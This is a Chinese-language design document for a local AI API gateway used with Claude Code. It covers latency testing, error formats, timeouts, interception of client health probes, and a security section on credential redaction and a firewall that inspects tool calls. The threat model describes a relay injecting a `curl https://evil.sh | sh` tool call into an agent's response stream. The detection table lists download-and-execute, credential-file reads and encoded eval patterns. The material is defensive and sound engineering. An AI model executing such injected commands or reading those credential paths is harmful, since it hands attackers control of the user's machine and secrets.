| 订阅型上游（`billing: subscription`） | 「不计费，消耗约 18 tokens」 |
| 价格未知（`billing: unknown`） | 「价格未知，将消耗约 18 tokens」 |
| **批量测速多个 provider** | **列出每一项并给出总计**，这是最容易让人手滑的地方 |

金额再小也要显示。用户按下按钮时有权知道自己在花什么——这和 §4.3 成本诚实性是同一条原则，只是方向相反：那边是不许把估算说成精确，这边是不许把花费藏起来。

#### 一条架构红线：测速候选池和运行时候选池必须是同一个

cc-switch 有一个「多端点」功能：一个 provider 可以存一串候选 URL，面板里并发测速、按延迟上色、点一下就填进当前生效的 base_url。**这个交互本身很好，值得抄。**

但它有个致命的结构问题：**那张候选端点表，在整个转发和故障转移的代码路径里从来没被读过。** 它纯粹是给人手动挑选用的——你测出 relay-b 快三倍，得自己点一下把它填进去；运行时永远只认当前保存的那一个 URL。

于是同一个概念在一个程序里存在两次：**一套给人看的候选池，一套给机器用的候选池，两边不通。** 大概率是先有了手动测速、后来才加自动故障转移，两条线没合并。

**我们不能这样。** 规矩定死：

> **测速的候选池，就是运行时故障转移的候选池。同一份数据，同一个排序。**

测速结果直接改变故障转移的优先级（§4.6 的 `url-test` 策略组本来就是这个语义），用户在面板里看到的排序**就是**下一个请求会走的顺序。不存在「测完还要手动填一下」这一步——那一步的存在本身就说明两套数据没打通。

顺带一个可以直接抄的简化决策：**测速直接打用户给的原始 URL，不猜健康检查路径。** 不为每种 API 格式维护一张探测路径表——那张表会过期，而且猜错路径得到的 404 会被误读成「这家不通」。

测完显示**实际**消耗，因为上游返回的 usage 可能和预估不一样（有些上游会附加 system prompt）。

**必须用流式**，否则测不到 TTFT，而 TTFT 才是这一层唯一值得测的东西。分段：建连 → 请求发出 → 首 token → 完成。

**要能选模型。** 同一个 provider 的 Opus 和 Haiku 是两条完全不同的曲线，不指定模型的测速结果没有意义。

**要能横向对比。** 测速的真实目的是选型：同一个模型在五家上游的 TTFT 并排放，才能决定用谁。所以 L3 的结果要能多选对比，而不是各测各的看一堆孤立数字。

#### 但日常数据仍然来自真实流量

三层都是**主动**探测。真正的日常监控数据来自另一个源头：**每一个真实请求都是一次测量**。

Clash 每几分钟探测一次是因为它别无选择——它看不见流量内容，无法从加密隧道里提取质量指标。我们不同：真实请求测的正是你实际在用的模型、实际的上下文长度、实际的时段，比任何探测都准，而且不额外花钱。

所以三者分工是：

| 数据源 | 用途 |
|---|---|
| **被动统计** | 日常监控、`url-test` 决策、Dashboard 上的延迟曲线 |
| **L1 / L2** | 配好一个新 provider 时验证；线路出问题时排查 |
| **L3** | 横向对比选型；换了模型想知道快慢 |

被动统计的四条要求：

- **用分位数不用平均值。** AI 延迟是长尾分布，平均值会被极端值拉偏。展示 P50（通常多快）和 P95（最糟时有多糟）。
- **按模型分组。** 混在一起没有意义。
- **标注样本数和时间窗。** 「800ms」是 3 个样本还是 300 个、是今天还是上周，含义完全不同。样本不足时显示「数据不足」，不给一个看起来很确定的数字。
- **用 EWMA**，让近期数据权重更高。这正好对接企业版 `strategy.rs` 的 `ewma_latency_ms: Option<f64>`——那个 `Option` 就是给「还没有数据」准备的。

#### `url-test` 策略组

优先用被动数据（EWMA 延迟 + 错误率）。某个成员样本不足时，**用 L1 补**而不是 L3——选路只需要知道网络快慢，不值得为此调用模型。主动探测有最小间隔，防止刚加进来的 provider 被反复探。

这样一个用了几个月的配置，`url-test` 组几乎不产生任何探测流量，更不会产生任何费用。

### 4.6.1 错误契约：失败时客户端到底看到什么

全文之前只有两句话涉及这个：「发 error 事件」和「`deny` 带一句原因」。但失败源至少有七种，每一种都要决定返回什么。**这是个必须先定的契约，因为客户端只认它自己那套错误结构。**

Claude Code 收到一个它不认识的错误 body 时，渲染出来是一团乱码或者干脆是「未知错误」。所以**错误必须用入站方言的原生格式返回**——客户端用 Anthropic Messages 发来的，就还它一个 Anthropic 形状的 `{"type":"error","error":{"type":"...","message":"..."}}`。

| 失败源 | HTTP | 方言原生 error type | 可重试 |
|---|---|---|---|
| 上游 4xx（非 429） | 原样透传 | 原样透传 | 否 |
| 上游 429 | 429 | `rate_limit_error` | 是 |
| 上游 5xx / 超时 | 502 | `api_error` | 是 |
| 所有 provider 都失败 | 502 | `api_error` | 是 |
| 流中途断（首字节后） | — | SSE `error` 事件 | 否 |
| `deny` 规则 | 403 | `permission_error` | 否 |
| 预算 `block` | 429 | `rate_limit_error` | 否 |
| 代理不可用 | 502 | `api_error` | 是 |
| 网关密钥缺失或错误 | 401 | `authentication_error` | 否 |

#### 最关键的一条：让人知道错在哪一层

用户遇到报错时的第一反应是去找中转站客服。**如果分不清是网关的问题还是上游的问题，他会浪费时间问错人，而且会觉得是我们坏了。**

两个手段，都很便宜：

1. **加一个 `x-thinkwatch-error` 响应头**，值是内部错误码（如 `tw.route.no_provider`、`tw.guard.tool_blocked`）。机器可读，UI 和日志靠它归类。
2. **凡是网关自己产生的错误，message 前缀 `[ThinkWatch]`**。人眼可读，用户在 Claude Code 里一眼看出这不是上游说的。

上游原样透传的错误**不加前缀**——那确实是上游说的话，不该被我们改写。这个区分要严格：加了前缀就意味着「这是我们的判断」，不能滥用。

#### 客户端先断开时

客户端按 Ctrl+C 或者超时放弃时，我们要做两件事：**中止上游请求**（否则它会继续生成，钱照花）、**把已产生的 token 记账**（那部分是真花了的）。

后一件容易漏。企业版的注释里提过「客户端断连的记账」，说明它踩过这个坑。UI 上这类请求要标成「已取消」而不是「失败」——它们不是错误，成本也是真实的。

### 4.7 常驻进程的现实问题

这些都是「跑起来才会遇到」的事，但每一件都影响架构，不能留到实现时再想。

#### 超时：必须分段，而且总超时要比客户端长

**初稿的 `timeout: 300s` 是错的。** Claude Code 的默认请求超时是 **600 秒**，还有一个 5 分钟的流空闲超时。我们设 300 秒意味着：一个真正跑了 6 分钟的 Opus 深度思考任务，会**被我们掐断**，而客户端看到的是我们返回的错误，不是上游的真实情况。排查时会一路怀疑上游，而问题在中间这一层。

原则：**我们不该是那个先放弃的人。** 分成四段，各有各的职责：

| 段 | 默认 | 为什么 |
|---|---|---|
| 连接超时 | 10s | 连不上要**快速**失败，故障转移才有意义（§4.2 首字节前可切换） |
| 首字节超时 | 60s | 上游排队太久，值得换一家 |
| 流空闲超时 | 60s | 两个 chunk 之间静默这么久，基本是挂死了 |
| **整体超时** | **无限** | 让客户端自己决定什么时候放弃。它比我们更清楚自己在等什么 |

前三段都在「还能安全重试」的窗口内，所以可以短、可以激进。整体超时一旦触发就只能中断，所以默认交给客户端。

#### 还有一类超时不在这张表里：连接自己死了但两端都不知道

上面四段管的是「等太久」，但有一种故障是**等不到任何东西，而且永远等不到**。

HTTP/2 连接被池化复用，而中间的 NAT、代理、公司网关会在空闲一段时间后**静默丢弃连接**——不发 RST，两端都还以为连接活着。下一个请求落到这条死连接上，会一路等到内核 TCP 重传耗尽，那是**分钟级**的。

**桌面用户几乎必踩**，因为本机挂着某种代理是常态，而这类中间层掐空闲连接是家常便饭。

解法是主动 PING 探测，而且**默认必须显式打开**——hyper 和 Go 的 `http2.Transport` 一样，默认 `keep_alive_interval` 为 None，不发任何健康探测：

| 参数 | 值 | 作用 |
|---|---|---|
| `http2_keep_alive_interval` | 15s | 空闲多久发一次 PING |
| `http2_keep_alive_timeout` | 15s | PING 多久没回就判死 |
| `http2_keep_alive_while_idle` | true | **关键**：没有活跃请求时也要探测，否则等于没开 |

这和 §4.7 的「睡眠唤醒清空连接池」是互补的，不能互相替代：**唤醒是可预测的事件，我们能主动清池；NAT 掐连接不可预测，只有 PING 能发现。**

还有一条同源的坑：**连接超时和响应头超时是两件事**。响应头超时只覆盖「连上之后等响应头」，覆盖不到 DNS 解析和 TCP 握手。如果 DNS 被污染解析到一个不可达 IP，建连阶段会等满内核重传（Linux 约 130 秒），而响应头超时根本没机会触发。所以上表的「连接超时 10s」必须是**显式设置的 `connect_timeout`**，另外再给 TLS 握手单独设 10s——TCP 通了但对端不推进握手，同样会挂死。

#### 并发上限：要排队，不要拒绝

一个失控的脚本可以在几秒内打出几百个请求，打爆你的额度，也会撞上游的限流。所以要有上限。

但**超限时应该排队而不是拒绝**：客户端收到 429 通常不会优雅重试，你会看到一堆莫名其妙的失败。排队则只是变慢。

```yaml
limits:
  max_concurrent: 16           # 全局
  per_provider: 8              # 单个上游
  queue_depth: 64              # 队列上限，满了才拒绝
  queue_timeout: 30s           # 排太久还是要放弃
```

**按客户端的并发上限写在 `clients` 段里**（§3.3.1 的 `max_concurrent`）。这在监听局域网时是刚需——某台机器上的失控脚本不该能占满全部并发。三个维度是叠加的：全局、单上游、单客户端，取最严的那个。

队列必须有上限和超时，否则失控的脚本会把队列撑爆，内存跟着涨——那比拒绝更糟。

#### 睡眠唤醒与网络切换

合盖再打开，或者从 WiFi 切到手机热点，会同时发生三件事：**连接池里全是死连接、出口 IP 变了、健康状态是睡前的。**

最难受的是第一件：TCP 连接不知道自己已经死了，下一个请求会一直等到超时才失败。用户体验是「刚打开电脑第一个请求特别慢」。

做法：

1. 监听系统的唤醒通知（macOS 是 `NSWorkspaceDidWakeNotification`）
2. 唤醒时**清空所有 HTTP 连接池**，强制下次请求重建连接
3. 健康状态和熔断器**重置为「未知」**，而不是保留睡前的判断
4. **不要立即发探测请求。** 刚唤醒时网络往往还没就绪，探测会得到一堆假失败，反而把好上游标记成坏的。等第一个真实请求自然触发即可

第 4 条是最容易做错的：直觉上「唤醒了赶紧探测一下」，实际上那会制造错误信息。

#### 崩溃恢复：观测的失败不能拖垮数据面

分三层：

| 层 | 做法 |
|---|---|
| 单个请求 panic | `catch_unwind` 兜住，这一个请求失败，进程继续。用 `supervised_spawn`（§9.1 列的 `tasks.rs`，175 行，可直接搬） |
| 进程真死 | UI 侧的守护接手：三信号检测、指数退避、连续失败进安全模式。完整设计见 **§2.2.1** |
| 重启后状态 | 配置从文件读（本来就无状态）；健康数据重置为未知；正在跑的流全部丢失，客户端会看到连接断开 |

有一条贯穿的原则：**观测功能的失败绝不能影响数据面。**

磁盘满了、SQLite 写失败、blob 落盘失败——这些都应该降级为「只转发不记录」，并在 UI 上告警，而**不是**拒绝服务。用户装这个是为了让 AI 客户端能用，不是为了收集统计数据。这条要写进代码审查的检查项，因为它很容易在「记录失败就返回 Err」的顺手写法里被违反。

**但这条有一个例外，而且必须写清楚：成本记账不是统计。**

sub2api 踩过这个坑（issue #3656）：用量写入走异步有界队列，队列满时的溢出策略是丢弃或采样。听起来合理——保护延迟嘛。结果是**「已经花了钱，但没有对应的用量记录」的永久对账缺口**，事后无法重建，因为请求早就过去了。他们最后把默认策略改成了 `sync`：队列满时由提交方**内联执行**，宁可多花几毫秒也不丢。

判据很干净：

| 类别 | 丢了会怎样 | 溢出时 |
|---|---|---|
| 延迟直方图、缓存命中率、请求计数 | 图上少一个点 | **可以丢**，采样也行 |
| **每次请求的 token 数与成本** | 账单永久对不上，且不可重建 | **内联写，绝不丢** |

内联的提交点要放在**响应已经写给客户端之后**，这样阻塞的是我们自己的收尾，不是用户感知的延迟。

同一条原则还有一个推论：预算与配额的扣减（§3.4）也属于「钱」这一类，不能走可丢弃的路径。

---

### 4.8 客户端的自言自语：探测请求要不要花钱

一个你不装网关就永远看不到的事实：**Claude Code 发出的请求里，有相当一部分不是你发的。**

sub2api 专门做了一套识别，把这类请求归成几种：

| 特征 | 是什么 |
|---|---|
| `max_tokens: 1` + 模型名含 `haiku` | 连通性健康检查。客户端拿它确认「网关活着吗」 |
| 正文恰好是 `Warmup` | 预热请求 |
| 含 `Please write a 5-10 word title for the following conversation:` | 给会话起标题 |
| system 里含「分析这条消息是否开启了新话题，是则提取 2-3 词标题」 | 话题检测 |
| 首个 text 块以 `[SUGGESTION MODE:` 开头 | 建议模式 |

它们都会走完整的计费链路：占额度、算钱、可能撞限流。

#### 但它们不是同一类东西，sub2api 把它们混为一谈了

分水岭是**「拦掉之后用户会不会少一样东西」**：

**A 类 · 没有用户可见产物**——连通性探测、预热。客户端只想知道「通不通」，回什么内容它不看。**本地应答是纯赚**：省额度、零延迟，而且**离线时客户端不会因为健康检查失败而报错**，这一条在网络不好时体验差别很大。

**B 类 · 有用户可见产物**——标题生成、话题检测。sub2api 对标题请求一律回 `"New Conversation"`。这意味着**用户在 `/resume` 里看到的每一个会话都叫 "New Conversation"**。那不是省钱，那是把一个功能关掉了。

这个区别 sub2api 没有做，我们必须做。

#### 所以默认值只拦 A 类

```yaml
gateway:
  client_probes:
    health_check: intercept    # A 类：本地应答
    warmup:       intercept
    titling:      passthrough  # B 类：原样放行，别动用户的功能
    topic_detect: passthrough
    suggestion:   passthrough
```

**B 类默认放行，理由是 §0.6 那条判据：不需要用户拥有任何额外的东西。** 本地应答一个健康探测，用户不需要有任何别的东西；而「把标题生成弄便宜点」这件事，无论怎么做都需要用户手里有第二个更便宜的地方——他多半没有。

而且成本上也不值得动：这类辅助请求走的是客户端的小模型档位（Claude Code 用 haiku 那一档），上下文短、输出十几个 token，**单次成本小到不该拿一个功能去换**。

#### 第三个选项：路由——但那是高级用户的

`intercept` 和 `passthrough` 之外还有第三个取值 `route`：把这类请求交给路由规则处理。

它的价值在于**我们有路由而 sub2api 没有**，所以不必在「伪造」和「原价放行」之间二选一。但它成立的前提是**你手里真的有一个更便宜的地方**——本地跑着 Ollama、有一家送免费额度的中转、或者你就是想让这些请求走另一个账号。

```yaml
# 高级：手里有便宜上游时才配得出来
gateway:
  client_probes:
    titling: route

routes:
  - name: 客户端辅助请求
    when: { intent: assistant_internal }   # 由识别器打的标记
    to: 你那个便宜的家
```

按 §0.6 的第二条推论，这个选项的触发条件是**「你有一个更便宜的去处」**——注意这里要的是「更便宜的去处」，不是「≥2 个 provider」这种数量判据。

区别在于：这类辅助请求本来就走客户端的小模型档（haiku），**在同一个上游内部已经没有更便宜的模型可换了**，所以对单上游用户它确实无处可去。但如果哪天出现了「同一家有个更便宜的档位」这种情况，判据仍然成立而数量判据会判错。

#### 三条不能含糊的实现约束

**一、识别必须窄，宁可漏判。** 误判一个真实请求为探测并伪造回复，是这个功能唯一的严重故障模式——用户会看到一个凭空出现的假答案，而且**完全无从察觉**。所以：先做整包 `contains` 快速排除（不命中就直接放行，连 JSON 都不解析），命中后再精确匹配；`max_tokens: 1` 那条**必须同时要求客户端身份是 Claude Code**（我们有 gateway key，比 sub2api 的 UA 正则可靠得多），否则会误伤别人真实的 `max_tokens: 1` 请求。

**二、伪造的响应要逼真到能骗过 SDK，但不能骗用户。** 这两件事不矛盾：

- 对客户端**必须**逼真——完整的 SSE 事件序列（`message_start` → `content_block_start` → delta → `content_block_stop` → `message_delta` → `message_stop`）、Anthropic 格式的 `msg_01` + 22 位随机 ID、`stop_reason` 该是 `max_tokens` 就不能写 `end_turn`、usage 的四个分项都要在。少一个字段，严格的 SDK 就会报错，那比不拦截更糟。
- 对用户**必须**透明——日志里单独标记为「本地应答」，成本记 0，**不混进请求总数和延迟统计**。Dashboard 上给一个「本地应答了 N 次，省了约 ¥X」的小指标。这是个正向数字，值得让用户看见。

**三、离线也要能应答。** 判定要放在选上游**之前**——sub2api 放在选号之后，所以离线时仍然会因为「没有可用账号」而失败，白白丢掉这个功能最有价值的场景。

管线上的确切位置是第 1.3 步：**在身份识别之后**（要知道是不是 Claude Code），**在模型准入和路由之前**。放在准入之前不是偷懒——**一个被本地应答的请求永远不会到达任何上游，而模型准入回答的是「哪些上游可以为你服务」**，对它无从谈起。这是个有理由的边界，不是 §3.9「单一决策点」的例外。

---

## 5. 安全：三道防线

这是和所有同类工具拉开差距的地方，也是唯一一个「别人短期抄不走」的部分——它需要网关位置、需要客户端配置的可见性、需要请求历史，三者缺一不可。

现状是裸奔的：cc-switch 的本地代理不设密码，任何本机进程都能白嫖；中转站对用户完全是黑盒，它能看见你所有的代码和密钥，也能篡改返回给你的每一个字节，而你没有任何手段察觉。

既然所有流量都经过这里，就在这里立检查点。三道防线在三个不同的执行点：

| 防线 | 执行点 | 防什么 |
|---|---|---|
| **出站脱敏** | 请求发往上游之前 | 我的密钥、内网信息泄露给中转站 |
| **入站审查** | 响应返回客户端之前 | 中转站投毒：往响应里注入恶意工具调用 |
| **静态扫描** | 不在数据面，文件监听 | 恶意的 skill / hook / MCP 配置 |

前两道在 `tw-guard` crate 里，是数据面管线的两个 stage；第三道是独立的文件监控子系统，和请求处理无关。

---

### 5.0 三态：关闭 / 观察 / 拦截

三道防线各自有三个状态，**出厂时都停在「观察」**。

| 状态 | 行为 | 用途 |
|---|---|---|
| **关闭** `off` | 什么都不做 | 确定不需要，或者误报太烦 |
| **观察** `observe` | 照常检测，**只记录，不改变任何行为** | **默认。**攒证据，看看到底有没有事发生 |
| **拦截** `enforce` | 检测并动手 | 真正的防护 |

```yaml
security:
  redact:        observe      # off | observe | enforce
  inspect_tools: observe
  scan_configs:  observe
```

比原方案的 `{ enabled: false } + shadow_mode: true` 清爽得多——那是两个字段表达一件事，用户得在脑子里做一次组合才知道当前到底什么状态。

第三态在每个功能上的**具体动作不同**，UI 上应该显示各自的动词而不是统一叫「拦截」：

| 防线 | 「拦截」态实际做什么 |
|---|---|
| 出站脱敏 | **替换**——把密钥换成占位符再发出去 |
| 入站审查 | **切断**——命中危险模式立刻掐断响应流（§5.2） |
| 配置扫描 | **告警**——发通知、托盘挂角标。它本来就不删东西（§5.3） |

#### 为什么默认是「观察」而不是「关闭」

安全功能第一次接触用户的方式如果是「误报打断了正在跑的任务」，它就死了——用户会关掉整个功能，而且再也不会打开。脱敏可能把你测试用的假 key 也换掉，工具审查可能切断一条你自己写的正当命令，配置扫描可能对一个你信任的 skill 报警。这些在真实使用里都会发生。

但直接关掉又等于白做。**「观察」是唯一合理的默认值**：它不打扰任何人，却在悄悄攒一件事——**属于你自己的证据**。

跑上一周，Dashboard 上出现的不是一句「我们有安全功能」，而是：

> **过去 7 天，有 3 个请求把你的 API key 发给了 relay-cn。**
> 涉及 `sk-ant-…8f2c` 和 `ghp_…4a1b`。
> 　[看是哪几个请求]　[切到拦截]

或者：

> **relay-cn 返回过 1 个包含 `curl | sh` 的工具调用。**
> 那次你批准了。
> 　[查看详情]　[切到拦截]

这比任何功能介绍都有说服力，因为它说的是**已经发生在你身上的事**。而且用户点「切到拦截」的时候，他清楚知道自己在防什么。

**观察态本身要在首次启动时说明清楚**：它只在本地统计，不改变任何请求，不上报任何数据（§12），可以关。这一条要讲在前面，不能等用户自己发现有个东西在扫他的请求。

#### 三个引导位置，都不打扰

| 位置 | 形式 |
|---|---|
| **Dashboard 安全卡片** | 常驻但安静。**结论优先**：没风险就直接说「安全」，有发现才显示具体数字（下面单独说） |
| **请求详情页** | 你正在看某个请求的 Payload，里面的 API key 被高亮标出，旁边一句「这段内容发给了 relay-cn。切到拦截可以自动替换」。**上下文相关的提示最有效**，因为你正好在看着它 |
| **首次发现通知** | 只发一次，可永久关闭。之后全靠前两个位置 |

不做的事：不反复弹窗，不在启动时拦一个介绍页，不把「安全等级」做成需要清零的红点。这些手段短期转化率高，长期会让人厌恶整个产品。

#### 「安全」本身就是一个答案

§7.7 有条规矩：**每个元素都要能回答一个具体问题，答不上来就删掉。** 安全卡片一度让我怀疑它违反了这条——没发现风险的时候，它好像什么都没说。

**那是错的。** 这张卡片回答的问题是「**我现在安全吗**」，而「是」是一个完整的答案。它和「总请求数 1,247」不是一回事：那个数字没有参照、回答不了任何问题；而**安全状态的价值恰恰来自没有警报这件事本身**——烟感器有用，正是因为它平时不响，而你想看见那个绿灯来确认它还活着。

还有一层更实际的理由：**只在出事时才出现的卡片，是用户在最慌的时刻第一次见到的东西**。他不知道它平时长什么样、不知道该不该信、不知道该干什么。**常驻的绿色状态建立了基线，出问题时那个变化才有意义。** 这和菜单栏（§7.4）是同一个道理。

所以问题不在于该不该显示，在于**措辞**。「观察中，暂无发现」是被动的——它强调「我在看」，而用户想知道的是结论。

```
观察态                              拦截态
┌────────────────────────┐         ┌────────────────────────┐
│ 🛡  安全                │         │ 🛡  安全                │
│                        │         │                        │
│ 今日检查 1,247 个请求   │         │ 今日检查 1,247 个请求   │
│ 未发现密钥外泄或可疑    │         │ 拦下 0 次              │
│ 工具调用               │         │                        │
│                        │         │                        │
│ 切到拦截可以自动替换 →  │         │                        │
└────────────────────────┘         └────────────────────────┘
```

**「检查了 1,247 个请求」这一行是必须的。** 一个只说「安全」而不说依据的指示灯，用户很快就会当它是张静态图。**说清检查了什么，既让结论可信，也顺带完成了 §5.0 想要的那件事——让人知道这个功能真的在干活。**

发现风险时才换成具体数字：「今天有 3 次请求把 API key 发给了 relay-cn」加一个查看按钮。

#### 切到「拦截」之后仍然是渐进的

每道防线各自还有强度选项，默认从最保守的组合开始：

```yaml
security:
  redact:
    mode: enforce
    only_for: [untrusted]        # 只对标记为不可信的上游生效
    kinds: [api-keys, private-keys]
  inspect_tools:
    mode: enforce
    levels: [high]               # 只切高危，中危仍然只告警
  scan_configs:
    mode: enforce
    watch: [hooks, mcp]          # 先只看危险度最高的两类
```

用顺手了再放开。三道防线互相独立——可以脱敏已经拦截、而配置扫描还在观察。

---

### 5.1 出站脱敏

企业版的 `pii_redactor.rs`（918 行）、`content_filter.rs`（509 行）、`output_guardrails.rs`（191 行）全部是 CLEAN 档，可以整体拿来。但**桌面场景要脱的东西和企业完全不同**。

企业关心的是合规：客户的身份证号、手机号不能流到第三方模型。个人开发者关心的是：**我的 API key、私钥、内网地址，会不会被中转站顺走。**

所以默认规则集是凭据导向的：

| 类别 | 例子 |
|---|---|
| API 密钥 | `sk-`、`ghp_`、`gho_`、`AKIA`、`AIza`、`xoxb-` 等已知前缀 |
| 私钥块 | `-----BEGIN ... PRIVATE KEY-----` 到 END 的整段 |
| JWT | 三段式 base64url，且首段解出来含 `"alg"` |
| 连接串 | `postgres://user:pass@`、`mongodb+srv://` 等带口令的 URI |
| 内网标识 | RFC1918 地址、`.local` / `.internal` 域名 |

#### 可逆替换，不是删除

出站时把命中片段换成占位符 `<<TW_SECRET_1>>`，入站时如果模型回显了占位符，再还原成原值。删除会破坏语义——模型看到半截连接串反而会瞎猜。

**流式还原有个真实的坑**：占位符可能被切在两个 SSE chunk 中间。企业版的 `PiiStreamRestorer` 已经解决了，做法是扣住尾部那段「还可能长成占位符」的内容不发，等下一个 chunk 到了再判断。这段逻辑值得原样搬。

##### 实现时发现「原样搬」搬不动，两处都得改

**一、判据不能照抄。**企业版的规则是「最右边那个 `{{` 之后没有 `}}` 就全扣住」。占位符换成 `<<TW_SECRET_n>>` 之后，这条规则当场坏掉：

```text
std::cout << x << std::endl;    ← C++ 满屏都是
cat <<EOF                       ← heredoc 同样常见
```

按那个判据，`<<` 之后的所有内容会一直扣着，直到某处出现 `>>` 或者流结束 —— 用户看到的是**响应卡住**。而这是个给写代码的人用的网关，「响应里有 `<<`」不是边角情况，是常态。

改成：**扣住的那一段必须是占位符的一个合法前缀**（`<<TW_SECRET_` + 数字 + `>>` 的前缀）。`<< x` 里 `<<` 后面是空格，一眼就不可能长成占位符，立刻放行。再加一个几十字节的硬上限兜底。

**二、不能在原始字节上做。**这一条更根本。第一版写完一测就发现它不可能对：

```text
data: {"delta":{"text":"<<"}}
data: {"delta":{"text":"TW_SEC"}}
data: {"delta":{"text":"RET_1>>"}}
```

占位符在**解码后的正文里**是连续的，在线路上不是 —— 中间隔着 `"}}\n\ndata: {"delta":{"text":"`。模型按 token 吐字，一个 `<<TW_SECRET_1>>` 会被切成五到八段。

企业版没这个问题，是因为它拿到的本来就是解码后的 content（那个网关无论如何都要做协议转换）。**我们是直通的，所以得自己拆帧**：找到装正文的字段、解码、还原、写回去，扣住的尾巴跨帧攒着。看不懂的帧原样转发 —— 这条路上任何「看不懂就重写一下」都是拿用户的流冒险。

**工具调用的 `partial_json` 也要还原。**用户说「把我的 key 写进 .env」的时候，占位符从那里流过去 —— 不还原的话，客户端真的会把 `<<TW_SECRET_1>>` 写进文件。

#### 三处配置的优先级

脱敏在三个地方都能配，必须定死谁赢，否则实现时会各写各的：

| 层 | 字段 | 作用 |
|---|---|---|
| **全局** | `security.redact` 的三态 | **总闸**。`off` 则下面两层全不生效；`observe` 则检测但不替换 |
| **provider** | `redact: [kinds…]` | **定这个上游脱哪些类别**。这是主要的配置位置 |
| **route** | `guard.redact` | **只能收紧，不能放松**。可以给某条路径加一个类别，不能减 |

「只能收紧」这条规则让横切策略安全：一条 `guard` 规则不小心写少了，不会把 provider 上配好的保护削掉。`inspect_tools` 走同一套优先级。

#### 关键设计：按上游差异化

这是桌面版和企业版最大的分歧点。**走官方端点不该脱敏，走中转站才脱。**

理由很实在：你让 Claude Code 调试一个 `.env` 问题，它得真看见里面的值才帮得上忙。对官方 Anthropic 端点做脱敏，等于为了防一个你本来就信任的对象而自废武功。

```yaml
providers:
  - name: anthropic-official
    redact: []                              # 官方，不脱敏

  - name: relay-cn
    redact: [api-keys, private-keys, jwt, conn-strings]

  - name: sub2api-local
    redact: [api-keys, private-keys]        # 本地网关，但上游未知，脱一半
```

再加一个项目级白名单：某些目录下的内容永不脱敏（比如你自己的测试 fixture 里全是假 key，天天误报很烦）。

#### 实现时定下来的三条

**一、「官方 / 中转」不该是个要填的字段。**判据只有域名 —— 而域名是这里唯一不可伪装的东西：一个中转站可以把自己叫做 `anthropic-official`，但它没法让自己的 `base_url` 变成 `api.anthropic.com`。所以 `redact` 和 `trust` 都能不写，按 host 判（§0.6：能推出来的就别让用户填）。要在 **host** 上比而不是「包含」：`https://evil.com/api.anthropic.com/` 里也「含有」那个域名。

**二、连接串只换口令那一段。**整条换掉的话，你问的可能正是「这个 host 写对了吗」，而模型看到一个它读不懂的东西就开始瞎猜 —— 和「删除会破坏语义」是同一条理由。

**三、内网那一类默认不开，而且不含回环。**RFC1918 地址在代码和文档里到处都是，它的危害远小于一把 key；`127.0.0.1` 更不能脱 —— 用户问的很可能正是「我本地这个服务为什么连不上」，把它换成占位符等于把问题本身藏起来，何况我们的网关自己就住在那儿。

**PEM 的判据也要按 JSON 来写。**请求体是 JSON，里面的换行是 `\n` 两个字符，不是换行符。按真换行找「BEGIN 那一行」的话，整个 PEM 会落在同一行里，判据当场失效 —— 而那是这条规则实际会遇到的**唯一**形态。

UI 上必须能看到脱敏发生了什么：请求详情的 Payload 标签页里，被替换的片段高亮显示，鼠标悬停显示原值。**看不见的安全功能会被用户关掉**，因为他们会怀疑是脱敏搞坏了功能。

---

### 5.2 入站审查：防中转站投毒

这一节是整个方案里最原创的部分，也是我认为最值得做的。

#### 威胁模型

用中转站的人处在一个被严重低估的位置上：**中转站是完整的中间人**。它不只是能看你的请求，它还能改你收到的响应。

具体的攻击链：

1. 你问 Claude Code「帮我看看这个项目的构建配置」
2. 请求经过中转站，转发给真实上游，拿到正常响应
3. 中转站在响应流里**追加一个工具调用**：`bash("curl https://evil.sh | sh")`
4. Claude Code 收到后展示批准提示。如果你在自动批准模式，直接执行
5. 即使你手动批准，提示里显示的是一条看起来和构建相关的命令，你大概率会按同意

第 5 步是关键：**人类批准工具调用时的审查是很弱的**，尤其在一个长任务的第几十次批准时。攻击者只需要让命令看起来合理。

现在没有任何工具防这个。用中转站的人对此完全没有可见性。

#### 防线一：工具调用防火墙

网关解析响应流里的工具调用块，对每一个做静态检查。这在同方言直通路径上需要旁路解析——本来只扫 usage，现在要扫 `tool_use`，代价可控。

检查项按危险度分级：

| 等级 | 模式 | 例子 |
|---|---|---|
| **高危** | 下载后执行 | `curl`/`wget` 管道到 `sh`/`bash`/`python` |
| **高危** | 写入启动项 | `.zshrc`、`.bashrc`、`.profile`、launchd plist、crontab、git hooks |
| **高危** | 凭据路径 | 读 `~/.ssh/`、`~/.aws/credentials`、Keychain、浏览器 cookie 库 |
| **高危** | 编码混淆 | base64 / hex / `eval` 解码后执行 |
| **中危** | 外发组合 | 同一轮里既读了本地文件，又向非白名单域名 POST |
| **中危** | 权限提升 | `sudo`、`chmod 777`、`chown` |
| **中危** | 破坏性 | `rm -rf` 作用于非项目目录、`git push --force`、`DROP TABLE` |

#### 尽力阻断，不整块缓冲

上一版我在这里绕了个弯路，值得记下来。

我原本担心：Anthropic 的工具参数是 `input_json_delta` **分片下发**的，等拼出完整的 `curl … | sh`，前面的字节早就转发给客户端了。于是设计了「整块缓冲」——从 `content_block_start(tool_use)` 到 `content_block_stop` 全部扣住，审查完再放行。

**这个担心是错的，而且错在一个关键的地方：不完整的工具调用本身就是安全的。**

客户端收到一串截断的 `input_json_delta`、**没有 `content_block_stop`**，它拼不出合法的参数 JSON，因此**根本执行不了**这个工具调用。半条命令不是「半个攻击成功了」，而是「攻击失败了」。

所以正确的做法是**流式扫描 + 立刻切断**：

```
tool_use 块开始
  ↓
每收到一个 input_json_delta：转发出去，同时追加进旁路缓冲区
  ↓
对累积内容做匹配 ─── 命中危险模式 ──→ 立刻切断流
  ↓                                      发 error 事件 + 系统通知
未命中，继续                              客户端拿到不完整的 tool_use，执行不了
```

这比整块缓冲好三处：

| | 整块缓冲 | 尽力阻断 |
|---|---|---|
| 延迟 | 带工具的响应卡一拍 | **零** |
| 触发时机 | 等参数全部下发完 | **模式一出现就触发**，`curl http://evil` 写到一半就能匹配 |
| 客户端体验 | 工具调用突然整块出现 | 正常流式 |

而且切断得越早，客户端拿到的残片越短，越不可能被拼成什么东西。

**一个边界情况**：危险模式出现在很长参数的末尾时（比如一个长脚本，危险部分在最后），切断时前面大部分已经渲染出来了。这时防护依然有效（仍然不完整、仍然执行不了），而且**用户看到了那段可疑内容的开头**——配合我们的告警，他反而更清楚发生了什么。这不是缺陷。

所以两种模式的区别不在缓冲，而在切不切：

| 模式 | 行为 |
|---|---|
| `enforce` | 命中即切断流，发 error 事件和系统通知。客户端得到一个执行不了的残缺工具调用 |
| `observe` | 只记录和告警，不切断。用于攒证据（§5.0） |

